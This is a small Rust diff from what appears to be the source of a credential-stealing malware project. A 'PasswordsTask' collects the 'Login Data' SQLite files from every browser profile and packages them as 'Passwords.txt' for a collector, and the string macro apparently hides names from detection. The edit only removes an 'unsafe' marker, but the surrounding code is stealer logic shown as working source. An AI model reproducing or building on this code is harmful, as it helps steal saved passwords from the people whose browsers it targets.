@@ -25,7 +25,7 @@ impl PasswordsTask {
 impl<C: Collector> Task<C> for PasswordsTask {
     parent_name!("Passwords.txt");
 
-    unsafe fn run(&self, parent: &Path, collector: &C) {
+    fn run(&self, parent: &Path, collector: &C) {
         let Some(passwords) = collect_and_read_sqlite_from_all_profiles(
             &self.browser.profiles,
             |profile| profile / s!("Login Data"),
